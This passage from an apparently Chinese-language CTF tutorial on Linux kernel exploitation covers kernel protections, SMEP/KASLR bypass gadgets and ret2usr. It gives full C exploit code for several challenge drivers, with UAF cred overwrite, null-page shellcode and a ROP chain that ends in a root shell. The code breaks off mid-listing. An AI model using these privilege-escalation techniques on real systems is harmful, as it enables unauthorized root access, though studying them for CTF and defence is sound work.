(*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 我们一般会劫持这个 ioctl</span></span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h2 id="相关保护"><a href="#相关保护" class="headerlink" title="相关保护"></a>相关保护</h2><ol><li>smep: Supervisor Mode Execution Protection，当处理器处于 ring 0 模式，执行用户空间的代码会触发页错误。（在 arm 中该保护称为 PXN)</li><li>smap: Superivisor Mode Access Protection，类似于 smep，当处理器处于 ring 0 模式，访问用户空间的数据会触发页错误。</li><li>MMAP_MIN_ADDR：控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。</li><li>KASLR：Kernel Address Space Layout Randomization(内核地址空间布局随机化)，开启后，允许kernel image加载到VMALLOC区域的任何位置。</li><li>Canary, DEP, PIE, RELRO 等保护与用户态原理和作用相同。</li><li>/proc/kallsyms函数中将存放了大量关键的函数的真实地址，这是十分危险的，低版本内核也提供了一些保护措施如kptr_restrict保护，但是在4.15.*以上内核中，内核新增了一个保护机制，康康代码：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kallsyms_show_value</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (kptr_restrict) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> (kallsyms_for_perf())</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">/* fallthrough */</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> (has_capability_noaudit(current, CAP_SYSLOG))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">/* fallthrough */</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">kallsyms_for_perf</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PERF_EVENTS</span></span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">int</span> sysctl_perf_event_paranoid;</span><br><span class="line">    <span class="keyword">if</span> (sysctl_perf_event_paranoid &lt;= <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要同时保证sysctl_perf_event_paranoid的值小于等于1才可以成功的查看/proc/kallsyms，而在默认情况下，这个标志量的值为2。</p><h2 id="相关考点"><a href="#相关考点" class="headerlink" title="相关考点"></a>相关考点</h2><h3 id="编写-shellcode-姑且这么叫"><a href="#编写-shellcode-姑且这么叫" class="headerlink" title="编写 shellcode(姑且这么叫)"></a>编写 shellcode(姑且这么叫)</h3><p><code>commit_creds(prepare_kernel_cred(0));</code>就是这个，在用户态利用一些内核模块（就是驱动）的问题，让他们在内核态执行这个，从而把当前进程的<code>/bin/sh</code>提权。</p><h3 id="Null-pointer-dereference"><a href="#Null-pointer-dereference" class="headerlink" title="Null pointer dereference"></a>Null pointer dereference</h3><p>这个也可以骚起来是我第一次听说，可以用mmap在0地址处来一段shellcode。</p><h3 id="UAF-in-Kernel"><a href="#UAF-in-Kernel" class="headerlink" title="UAF in Kernel"></a>UAF in Kernel</h3><p>如果用户态程序多次打开同一字符设备，线程安全要设备自身去保证，否则就不安全，就会造成 UAF，也叫条件竞争 UAF。</p><h3 id="ROP-Chain-in-Kernel"><a href="#ROP-Chain-in-Kernel" class="headerlink" title="ROP Chain in Kernel"></a>ROP Chain in Kernel</h3><p>构造通过 rop 执行 commit_creds(prepare_kernel_cred(0))；返回用户态，通过 system(“/bin/sh”) 等起 shell。</p><h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>就是普通的，整数溢出。</p><h3 id="Bypass-SEMP-kASLR"><a href="#Bypass-SEMP-kASLR" class="headerlink" title="Bypass SEMP/kASLR"></a>Bypass SEMP/kASLR</h3><p>内核是根据CR4寄存器的值来判断smep保护是否开启的，当CR4寄存器的第20位是1时，保护开启；是0时，保护关闭。那么，如果在内核中存在gadget能让我们修改CR4寄存器的值我们就可以手动来关闭SMEP保护了。</p><p>有kASLR可以先关掉泄露地址，再打开推测地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81004d70 : mov cr4, rdi ; pop rbp ; ret</span><br><span class="line">0xffffffff8109054d : pop rdi ; ret</span><br></pre></td></tr></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="CISCN2017-babydriver-简单的-use-after-free"><a href="#CISCN2017-babydriver-简单的-use-after-free" class="headerlink" title="CISCN2017 - babydriver 简单的 use after free"></a>CISCN2017 - babydriver 简单的 use after free</h3><p>漏洞点是内核线程安全的uaf，直接放 exploit，比较好理解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 打开两次设备</span></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放 fd1</span></span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] fork error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[+] root now."</span>);</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Root-me-LinKern-x86-Null-Pointer-Dereference"><a href="#Root-me-LinKern-x86-Null-Pointer-Dereference" class="headerlink" title="[Root-me]LinKern x86 Null Pointer Dereference"></a>[Root-me]LinKern x86 Null Pointer Dereference</h3><p>我们的目标是调用commit_creds(prepare_kernel_cred(0))，那么我们的shellcode就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor eax,eax;</span><br><span class="line">call commit_creds;</span><br><span class="line">call prepare_kernel_cred;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure><p>其中commit_creds和prepare_kernel_cred函数的地址可以在/proc/kallsyms中定位到（由于这题什么保护都没开）。</p><p>所以也直接放 exploit，比较好懂：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 没有 pwntools 还是有点硬</span></span><br><span class="line"><span class="keyword">char</span> payload[] = <span class="string">"x31xc0xe8xe9x11x07xc1xe8x74x0ex07xc1xc3"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Get_shell[<span class="number">20</span>];</span><br><span class="line">    mmap(<span class="number">0</span>, <span class="number">4096</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/tostring"</span>,<span class="number">2</span>);</span><br><span class="line">    write(fd,<span class="string">"**********S"</span>,<span class="number">11</span>);</span><br><span class="line">    read(fd,Get_shell,<span class="keyword">sizeof</span>(Get_shell));</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2020高校战疫分享赛-–-babyhacker-ROP-Chain-in-Kernel、整数溢出、Bypass-SEMP-kASLR"><a href="#2020高校战疫分享赛-–-babyhacker-ROP-Chain-in-Kernel、整数溢出、Bypass-SEMP-kASLR" class="headerlink" title="2020高校战疫分享赛 – babyhacker ROP Chain in Kernel、整数溢出、Bypass SEMP/kASLR"></a>2020高校战疫分享赛 – babyhacker ROP Chain in Kernel、整数溢出、Bypass SEMP/kASLR</h3><p>还是直接放 exploit，本题利用点是，整数溢出，传入-1可以在栈上写很长的内容，然后需要先得到canary，再去掉保护，还要关kASLR看地址，然后就是常规的ROP操作，开一个shell，再用<code>commit_creds(prepare_kernel_cred(0));</code>把它提权。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *rip;</span><br><span class="line">    <span class="keyword">uint64_t</span> cs;</span><br><span class="line">    <span class="keyword">uint64_t</span> rflags;</span><br><span class="line">    <span class="keyword">void</span> * rsp;</span><br><span class="line">    <span class="keyword">uint64_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">launch_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>,<span class="string">"sh"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"mov %%cs,  %0n"</span></span><br><span class="line">        <span class="string">"mov %%ss,  %1n"</span></span><br><span class="line">        <span class="string">"mov %%rsp, %3n"</span></span><br><span class="line">        <span class="string">"pushfqn"</span></span><br><span class="line">        <span class="string">"popq %2"</span> :<span class="string">"=r"</span>(tf.cs),<span class="string">"=r"</span>(tf.ss),<span class="string">"=r"</span>(tf.rflags),<span class="string">"=r"</span>(tf.rsp) :</span><br><span class="line">        :<span class="string">"memory"</span></span><br><span class="line">    );</span><br><span class="line">    tf.rsp -= <span class="number">4096</span>;</span><br><span class="line">    tf.rip = &amp;launch_shell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> (*commit_creds)(<span class="keyword">uint64_t</span> cred) ;</span><br><span class="line"><span class="keyword">uint64_t</span> (*prepare_kernel_cred)(<span class="keyword">uint64_t</span> cred) ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"movq $tf, %rspn"</span></span><br><span class="line">        <span class="string">"swapgsn"</span></span><br><span class="line">        <span class="string">"iretqn"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> u64(<span class="keyword">char</span> * s)&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">7</span> ; i &gt;=<span class="number">0</span> ;i--)&#123;</span><br><span class="line">        result = (result &lt;&lt; <span class="number">8</span>) | (<span class="number">0x00000000000000ff</span> &amp; s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> leak_value[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> Send_value[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babyhacker"</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x30000</span>, <span class="number">-1</span>);</span><br><span class="line">    ioctl(fd1, <span class="number">0x30002</span>, leak_value);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for(int i = 0 ; i * 8 &lt; 0x1000 ; i++ )&#123;</span></span><br><span class="line">    <span class="comment">//     uint64_t tmp = u64(&amp;leak_value[i * 8]);</span></span><br><span class="line">    <span class="comment">//     printf("naddress %d: %pn",i * 8 ,tmp);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> Canary = u64(&amp;leak_value[<span class="number">40</span> * <span class="number">8</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"nCanary: %pn"</span>,Canary);</span><br><span class="line">    <span class="keyword">uint64_t</span> Rand_addr = u64(&amp;leak_value[<span class="number">42</span> * <span class="number">8</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"nRand address: %pn"</span>,Rand_addr);</span><br><span class="line"></span><br><span class="line">    prepare_kernel_cred = (<span class="keyword">void</span> *)(Rand_addr + <span class="number">0xffffffff810a1820</span> - <span class="number">0xffffffff81219218</span>);</span><br><span class="line">    commit_creds = (<span class="keyword">void</span> *)(Rand_addr + <span class="number">0xffffffff810a1430</span> - <span class="number">0xffffffff81219218</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">40</span> ; i++ )</span><br><span class="line">        Send_value[i] = <span class="number">0</span>;</span><br><span class="line">    Send_value[<span class="number">40</span>] = Canary;</span><br><span class="line">    Send_value[<span class="number">41</span>] = <span class="number">0</span>;</span><br><span class="line">    Send_value[<span class="number">42</span>] = Rand_addr + <span class="number">0xffffffff8109054d</span> - <span class="number">0xffffffff81219218</span>;</span><br><span class="line">    Send_value[<span class="number">43</span>] = <span class="number">0x6e0</span>;</span><br><span class="line">    Send_value[<span class="number">44</span>] = Rand_addr + <span class="number">0xffffffff81004d70</span> - <span class="number">0xffffffff81219218</span>;</span><br><span class="line">    Send_value[<span class="number">45</span>] = <span class="number">0</span>;</span><br><span class="line">    Send_value[<span class="number">46</span>] = payload;</span><br><span class="line">    Send_value[<span class="number">47</span>] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x30001</span>, Send_value);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2018-强网杯-core-ret2usr"><a href="#2018-强网杯-core-ret2usr" class="headerlink" title="2018 强网杯 - core ret2usr"></a>2018 强网杯 - core ret2usr</h3><p>ret2usr 攻击利用了 用户空间的进程不能访问内核空间，但内核空间能访问用户空间 这个特性来定向内核代码或数据流指向用户控件，以 ring 0 特权执行用户空间代码完成提权等操作。</p><p>废话不好，直接上exp。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 